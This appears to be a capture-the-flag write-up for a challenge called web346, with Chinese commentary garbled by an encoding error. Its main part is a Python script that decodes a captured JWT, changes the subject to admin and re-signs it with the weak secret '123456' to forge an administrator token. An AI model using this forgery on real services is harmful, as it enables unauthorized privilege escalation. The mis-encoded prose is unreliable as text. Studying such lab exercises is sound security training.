# web346
![](vx_images/200636042253163.png)
ç›´æ¥æŒ‡æ§ç®—æ³•,æ”¹ç”¨æˆ·ä¸ºadmin
ä¸”BPç›´æ¥æ£€æµ‹å‡ºäº†JWTå¼±å£ä»¤
![](vx_images/592727139892619.png)
è¯•ä¸€è¯•ä¼ªé€ ä»¤ç‰Œçš„æ–¹æ³•:
æ„é€ å‰:
![](vx_images/150398815628271.png)
æ„é€ å:
![](vx_images/109757593202042.png)
![](vx_images/398186136961270.png)
pythonä»£ç :
```
import jwt
from datetime import datetime, timedelta

# 1. å‡†å¤‡åŸå§‹JWTå’Œå¼±å¯†é’¥
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc1MzcxNDU0NSwiZXhwIjoxNzUzNzIxNzQ1LCJuYmYiOjE3NTM3MTQ1NDUsInN1YiI6InVzZXIiLCJqdGkiOiJjZmNhZjgyMWJkZTJiNTQ4MTNmMjUxMzJlOWU1OGYwMCJ9.jyanzpG4P5enIrwvRQc1xWHM8J51UPJmzpsS_LUEMYo"
weak_secret = "123456"

# 2. è§£ç åŸå§‹JWTè·å–payload
try:
    # ä¸éªŒè¯ç­¾åç›´æ¥è§£ç 
    decoded_payload = jwt.decode(
        original_jwt,
        options={"verify_signature": False}
    )
    print("åŸå§‹Payload:\n", decoded_payload)
except Exception as e:
    print("è§£ç é”™è¯¯:", e)
    exit()

# 3. ç¯¡æ”¹å…³é”®å£°æ˜ï¼ˆè¶Šæƒï¼‰
decoded_payload["sub"] = "admin"  # æ™®é€šç”¨æˆ·å˜ç®¡ç†å‘˜
# decoded_payload["role"] = "superadmin"  # å¯æ·»åŠ æ–°å£°æ˜
# decoded_payload["is_admin"] = True      # å¸ƒå°”å€¼å£°æ˜

# 4. æ›´æ–°æ—¶é—´æˆ³ï¼ˆç¡®ä¿æœªè¿‡æœŸï¼‰
current_time = int(datetime.now().timestamp())
decoded_payload["iat"] = current_time  # ç­¾å‘æ—¶é—´
decoded_payload["nbf"] = current_time  # ç”Ÿæ•ˆæ—¶é—´
decoded_payload["exp"] = current_time + 3600  # 1å°æ—¶åè¿‡æœŸ

# 5. é‡æ–°ç”ŸæˆJWTç­¾å
try:
    # ä½¿ç”¨å¼±å¯†é’¥ç”Ÿæˆæ–°token
    new_jwt = jwt.encode(
        payload=decoded_payload,
        key=weak_secret,
        algorithm="HS256"
    )
    print("\nğŸ” ç”Ÿæˆçš„æ¶æ„JWT:\n", new_jwt)
except Exception as e:
    print("ç­¾åç”Ÿæˆé”™è¯¯:", e)
    exit()

# 6. éªŒè¯ç¯¡æ”¹åçš„JWTï¼ˆå¯é€‰ï¼‰
try:
    verification = jwt.decode(
        new_jwt,
        weak_secret,
        algorithms=["HS256"]
    )
    print("\nâœ… ç­¾åéªŒè¯é€šè¿‡:")
    print("å½“å‰èº«ä»½:", verification.get("sub", ""))
    print("ç®¡ç†å‘˜æƒé™:", verification.get("is_admin", False))
except jwt.InvalidSignatureError:
    print("âŒ ç­¾åéªŒè¯å¤±è´¥")
```